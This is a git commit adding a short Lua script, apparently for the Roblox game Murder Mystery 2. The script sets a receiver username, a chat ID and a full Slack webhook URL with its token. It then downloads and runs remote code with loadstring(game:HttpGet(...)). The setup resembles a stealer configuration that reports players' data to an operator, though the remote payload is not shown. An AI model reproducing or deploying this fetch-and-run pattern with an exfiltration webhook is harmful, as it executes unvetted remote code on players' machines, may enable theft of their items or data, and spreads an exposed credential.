cb167264d4e53c0325a9b1136cef010e21571285
ScriptSt <ScriptSt@users.noreply.github.com>
2025-03-16 18:25:02 +0500

    Добавлен файл Tai.lua

---
+++ Tai.lua
@@ -0,0 +1,6 @@
+
+Username = "Tiam"
+ChatId = "-4609231133"
+SLHook = "https://hooks.slack.com/services/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"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptSt/MM2/main/YARHM"))()
